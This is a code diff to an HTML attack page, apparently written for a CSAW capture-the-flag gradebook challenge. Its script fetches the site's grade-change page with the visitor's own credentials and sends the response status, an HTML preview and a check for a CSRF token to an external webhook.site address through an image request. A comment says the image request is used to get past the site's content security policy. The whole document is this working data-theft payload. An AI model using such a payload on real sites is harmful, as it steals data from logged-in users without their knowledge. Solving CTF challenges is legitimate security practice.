@@ -2,32 +2,41 @@
 <html>
 <body>
     <script>
-        // Function to send data to webhook via GET request
-        function sendToWebhook(data) {
+        function exfiltrate(data) {
+            // Encode data in URL and use img tag (allowed by CSP: img-src *)
             const params = new URLSearchParams();
             params.append('data', JSON.stringify(data));
             new Image().src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?${params.toString()}`;
         }
 
-        // Fetch the grade-change page and return entire DOM
+        // Try to fetch the grade-change page
         fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
             credentials: 'include'
         })
-        .then(response => response.text())
+        .then(response => {
+            exfiltrate({
+                type: 'response_headers',
+                status: response.status,
+                statusText: response.statusText,
+                url: response.url,
+                redirected: response.redirected
+            });
+            return response.text();
+        })
         .then(html => {
-            // Send entire HTML to webhook
-            sendToWebhook({
-                type: 'full_dom',
-                html: html,
-                message: 'Full DOM of grade-change page'
+            exfiltrate({
+                type: 'success',
+                html_length: html.length,
+                html_preview: html.substring(0, 200),
+                has_csrf: html.includes('csrf_token')
             });
         })
         .catch(error => {
-            // Send error to webhook
-            sendToWebhook({
-                type: 'fetch_error',
+            exfiltrate({
+                type: 'error',
                 error: error.toString(),
-                message: 'Failed to fetch grade-change page'
+                error_name: error.name,
+                error_message: error.message
             });
         });
     </script>
